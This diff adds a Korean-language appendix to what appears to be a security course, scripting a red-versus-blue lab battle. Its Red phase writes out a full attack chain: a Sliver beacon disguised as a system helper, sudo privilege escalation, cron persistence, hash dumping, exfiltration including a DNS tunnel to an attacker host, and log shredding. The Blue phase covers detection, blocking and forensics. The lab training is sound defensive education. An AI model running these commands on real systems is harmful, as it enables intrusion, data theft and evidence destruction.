@@ -655,3 +655,189 @@ graph LR
 
 **학생 액션**: 1주 Purple Exercise → KPI 측정.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 14 레드vs블루 실전)
+
+### 본 14주차 = 종합 공방전 (week01-13 모든 도구 통합)
+
+```bash
+# === CCC battle-engine ===
+cd /home/opsclaw/ccc
+
+# 새 battle 생성
+./battle-cli.sh new \
+    --course course12 \
+    --week 14 \
+    --difficulty advanced \
+    --duration 4h
+
+# 모든 round 자동
+./battle-cli.sh start round1
+
+# 상태
+./battle-cli.sh status
+```
+
+### Round 1 — APT Kill Chain 시나리오
+
+#### Red Phase (90 분)
+
+```bash
+# === Phase 1: Reconnaissance (15분) ===
+sudo nmap -sV -p- --min-rate 1000 10.20.30.0/24 -oA /tmp/scan
+whatweb -v http://10.20.30.80:3000
+theHarvester -d target.local -b all
+amass enum -d target.local
+
+# === Phase 2: Initial Access (15분) ===
+# CALDERA APT29 자동 실행 또는 수동:
+
+# 2-1) Phishing (gophish 캠페인)
+sudo /opt/gophish/gophish &
+# Web UI 에서 캠페인 생성 → 발송
+
+# 2-2) 또는 web exploit (sqlmap + JuiceShop)
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+    --batch --random-agent --dbs
+
+# === Phase 3: Establish Foothold (10분) ===
+# Sliver C2 implant
+sliver-server &
+sliver > mtls --lhost 192.168.0.112 --lport 443
+sliver > generate beacon --mtls 192.168.0.112:443 --evasion --save /tmp/sliver-beacon
+
+# Implant 업로드 + 실행
+scp /tmp/sliver-beacon ccc@10.20.30.80:/tmp/.systemd-helper
+ssh ccc@10.20.30.80 "/tmp/.systemd-helper &"
+
+# === Phase 4: Privilege Escalation (10분) ===
+sliver > use 1
+sliver (target) > shell
+
+# LinPEAS 실행
+$ ~/peass/linpeas.sh -a -j > /tmp/linpeas.json
+$ exit
+
+# 발견된 vector 활용
+sliver (target) > exec sudo find / -exec /bin/sh \; -quit  # GTFOBins
+
+# === Phase 5: Persistence (10분) ===
+sliver (target) > generate beacon --save /tmp/p2.bin
+sliver (target) > exec '(crontab -l; echo "*/30 * * * * /tmp/p2.bin") | crontab -'
+
+# === Phase 6: Lateral Movement (15분) ===
+# BloodHound (AD environment 가정)
+bloodhound-python -d corp.local -u user -p pwd -ns 10.0.0.1 -c All
+
+# 발견된 path 따라 lateral
+nxc smb 10.0.0.0/24 -u admin -H "ntlm-hash"
+impacket-secretsdump 'admin@DC01'
+
+# === Phase 7: Data Exfil (10분) ===
+sliver (target) > exec 'tar czf /tmp/loot.tar.gz /etc/passwd /var/log/wtmp'
+sliver (target) > download /tmp/loot.tar.gz
+
+# 또는 DNS exfil
+sudo iodine -f -P pwd t.attacker.com
+
+# === Phase 8: Anti-forensics (5분) ===
+sliver (target) > exec 'shred -uvz /var/log/auth.log'
+sliver (target) > exec 'unset HISTFILE; history -c'
+```
+
+#### Blue Phase (90 분 — Red 와 동시)
+
+```bash
+# === 통합 모니터 dashboard ===
+watch -n 5 '
+echo "=== Wazuh (level >= 10, 5분) ==="
+sudo jq -r "select(.rule.level >= 10 and (now - (.timestamp | fromdateiso8601)) < 300) | \"[\\(.rule.level)] \\(.rule.description)\"" /var/ossec/logs/alerts/alerts.json | tail -10
+
+echo ""
+echo "=== Suricata 알람 ==="
+sudo jq "select(.event_type == \"alert\")" /var/log/suricata/eve.json | tail -10
+
+echo ""
+echo "=== Falco CRITICAL ==="
+sudo journalctl -u falco --since "5 min ago" --output cat | grep CRITICAL | tail -5
+
+echo ""
+echo "=== fail2ban / crowdsec ==="
+sudo fail2ban-client status sshd | grep "Banned IP"
+sudo cscli decisions list | head -10
+'
+
+# === 자동 대응 (Wazuh AR + Shuffle workflow) ===
+# 모든 level 13+ 자동:
+# 1. nft block (10.20.30.1)
+# 2. TheHive case 생성
+# 3. Slack 알림
+# 4. Velociraptor live hunt
+# 5. NetworkPolicy 격리
+
+# === 수동 IR ===
+# 1. 침해 호스트 격리
+ssh ccc@10.20.30.1
+sudo nft add element inet filter blocked '{ 192.168.0.112 }'
+
+# 2. 침해 host 의 evidence 수집
+ssh ccc@10.20.30.80
+sudo netstat -tlnp                                      # 의심 connection
+sudo ps auxf | head                                     # 의심 process
+sudo crontab -l                                         # cron persistence
+osqueryi 'SELECT * FROM systemd_units WHERE active_state="active";'
+
+# 3. 메모리 dump (Volatility)
+sudo insmod ~/lime/lime-$(uname -r).ko 'path=/forensic/mem.lime format=lime'
+vol -f /forensic/mem.lime linux.malfind
+vol -f /forensic/mem.lime linux.bash
+
+# 4. Velociraptor multi-host hunt
+velociraptor flow create EvidenceOfCompromise --client.id all
+
+# 5. Sigma rule 추가 (R1 발견 IoC)
+sigma convert -t suricata new-rule.yml | \
+    sudo tee -a /etc/suricata/rules/r1-incidents.rules
+sudo systemctl reload suricata
+```
+
+#### Round 1 판정 (CCC battle-engine 자동)
+
+```bash
+./battle-cli.sh score round1
+# 출력:
+# === Round 1 Result ===
+# Red Score: 78 / 110
+#   - Recon: ✓ (10 pts)
+#   - Initial Access (sqlmap): ✓ (15 pts)
+#   - Foothold (sliver): ✓ (15 pts)
+#   - Privesc (sudo find): ✓ (15 pts)
+#   - Persistence (cron): ✓ (10 pts)
+#   - Lateral (BloodHound + nxc): partial (8 pts)
+#   - Exfil: failed (Suricata DNS rule 차단) (0 pts)
+#   - Anti-forensic: ✓ (5 pts)
+# 
+# Blue Score: 92 / 100
+#   - Recon 5분 내 탐지: ✓ (10 pts)
+#   - sqlmap 차단: ModSec 부분 차단 (15 pts)
+#   - sliver TLS 탐지: JA3 fingerprint (15 pts)
+#   - Privesc Falco: ✓ (10 pts)
+#   - Persistence osquery: ✓ (10 pts)
+#   - Lateral Wazuh AR: ✓ (15 pts)
+#   - Exfil 차단 (DNS rule): ✓ (15 pts)
+#   - Anti-forensic 탐지: Falco shred rule (10 pts)
+# 
+# === Winner: Blue (정확도 우위) ===
+```
+
+### 4 Round 종합
+
+본 14주차 4 시간 동안 4 round 진행:
+- Round 1 (90분): APT 표준 시나리오
+- Round 2 (60분): R1 회고 반영 + 강화
+- Round 3 (60분): 다중 벡터 동시 (week13 형식)
+- Round 4 (30분): Sudden Death — 가장 강한 우회/탐지 도구만
+
+학생은 본 14주차 종합 공방전에서 **모든 OSS 도구 (40+) 통합 운용** + **CCC battle-engine** + **자동 점수 + ATT&CK 매핑** 으로 advanced level 의 실전 경험을 쌓는다.
